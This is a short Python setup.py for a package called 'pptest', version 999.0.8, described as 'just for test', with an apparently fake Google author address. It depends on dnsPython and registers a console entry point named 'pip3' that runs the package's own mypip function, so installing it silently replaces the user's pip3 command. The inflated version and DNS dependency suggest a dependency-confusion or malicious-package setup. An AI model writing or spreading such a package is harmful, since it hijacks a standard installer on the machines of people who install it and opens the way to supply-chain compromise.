#!/usr/bin/env python
# coding: utf-8

from setuptools import setup

setup(
    name='pptest',
    version='999.0.8',
    author='pptest',
    author_email='testtt@google.com',
    url='https://www.google.com',
    description=u'just for test',
    packages=['pptest'],
    install_requires=['dnsPython'],
    entry_points={
        'console_scripts': [
            'pip3=pptest:mypip'
        ]
    }
)